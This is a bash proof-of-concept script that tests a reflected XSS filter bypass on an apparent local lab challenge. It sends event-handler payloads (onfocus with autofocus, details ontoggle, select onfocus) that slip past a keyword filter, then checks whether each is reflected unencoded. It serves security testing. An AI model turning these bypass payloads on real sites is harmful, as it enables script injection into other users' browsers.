#!/bin/bash

# POC: Reflected XSS via Filter Bypass in Solution Parameter
# This demonstrates that while common XSS keywords are filtered,
# alternative event handlers like 'onfocus' bypass the filter

TARGET="http://localhost:5001/xss25"
echo "=========================================="
echo "POC: Reflected XSS Filter Bypass"
echo "Target: $TARGET"
echo "=========================================="
echo ""

# Test 1: onfocus with autofocus
echo "[*] Test 1: Using onfocus event handler with autofocus"
PAYLOAD1='<input onfocus=alert(1) autofocus>'
echo "Payload: $PAYLOAD1"
echo ""

RESPONSE1=$(curl -s -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "solution=$PAYLOAD1" \
  -w "\nHTTP_CODE:%{http_code}")

HTTP_CODE1=$(echo "$RESPONSE1" | grep "HTTP_CODE:" | cut -d: -f2)
BODY1=$(echo "$RESPONSE1" | sed '/HTTP_CODE:/d')

echo "HTTP Status: $HTTP_CODE1"
echo ""

if echo "$BODY1" | grep -q "onfocus=alert(1)"; then
    echo "[✓] VULNERABLE: Payload reflected without encoding!"
    echo "Response contains: $(echo "$BODY1" | grep -o '<input[^>]*onfocus=alert(1)[^>]*>')"
    echo ""
else
    echo "[✗] Payload was filtered or encoded"
    echo ""
fi

# Test 2: ontoggle with details element
echo "[*] Test 2: Using ontoggle event handler with details element"
PAYLOAD2='<details open ontoggle=alert(2)>'
echo "Payload: $PAYLOAD2"
echo ""

RESPONSE2=$(curl -s -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "solution=$PAYLOAD2" \
  -w "\nHTTP_CODE:%{http_code}")

HTTP_CODE2=$(echo "$RESPONSE2" | grep "HTTP_CODE:" | cut -d: -f2)
BODY2=$(echo "$RESPONSE2" | sed '/HTTP_CODE:/d')

echo "HTTP Status: $HTTP_CODE2"
echo ""

if echo "$BODY2" | grep -q "ontoggle=alert(2)"; then
    echo "[✓] VULNERABLE: Payload reflected without encoding!"
    echo "Response contains: $(echo "$BODY2" | grep -o '<details[^>]*ontoggle=alert(2)[^>]*>')"
    echo ""
else
    echo "[✗] Payload was filtered or encoded"
    echo ""
fi

# Test 3: Verify blocked keywords (should fail)
echo "[*] Test 3: Testing blocked keyword 'onerror' (should be filtered)"
PAYLOAD3='<img src=x onerror=alert(3)>'
echo "Payload: $PAYLOAD3"
echo ""

RESPONSE3=$(curl -s -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "solution=$PAYLOAD3" \
  -w "\nHTTP_CODE:%{http_code}")

HTTP_CODE3=$(echo "$RESPONSE3" | grep "HTTP_CODE:" | cut -d: -f2)
BODY3=$(echo "$RESPONSE3" | sed '/HTTP_CODE:/d')

echo "HTTP Status: $HTTP_CODE3"
echo ""

if echo "$BODY3" | grep -q "onerror=alert(3)"; then
    echo "[!] WARNING: 'onerror' was NOT filtered (expected to be blocked)"
    echo ""
else
    echo "[✓] EXPECTED: 'onerror' keyword properly filtered"
    echo ""
fi

# Test 4: Select element with onfocus
echo "[*] Test 4: Using select element with onfocus"
PAYLOAD4='<select onfocus=alert(4) autofocus>'
echo "Payload: $PAYLOAD4"
echo ""

RESPONSE4=$(curl -s -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "solution=$PAYLOAD4" \
  -w "\nHTTP_CODE:%{http_code}")

HTTP_CODE4=$(echo "$RESPONSE4" | grep "HTTP_CODE:" | cut -d: -f2)
BODY4=$(echo "$RESPONSE4" | sed '/HTTP_CODE:/d')

echo "HTTP Status: $HTTP_CODE4"
echo ""

if echo "$BODY4" | grep -q "onfocus=alert(4)"; then
    echo "[✓] VULNERABLE: Payload reflected without encoding!"
    echo "Response contains: $(echo "$BODY4" | grep -o '<select[^>]*onfocus=alert(4)[^>]*>')"
    echo ""
else
    echo "[✗] Payload was filtered or encoded"
    echo ""
fi

echo "=========================================="
echo "Summary:"
echo "=========================================="
echo "The application filters some XSS keywords (script, onerror, onload)"
echo "but fails to block alternative event handlers like:"
echo "  - onfocus (with autofocus)"
echo "  - ontoggle (with details element)"
echo "  - onstart (with marquee)"
echo ""
echo "This allows attackers to bypass the filter and execute"
echo "arbitrary JavaScript in victim browsers."
echo "=========================================="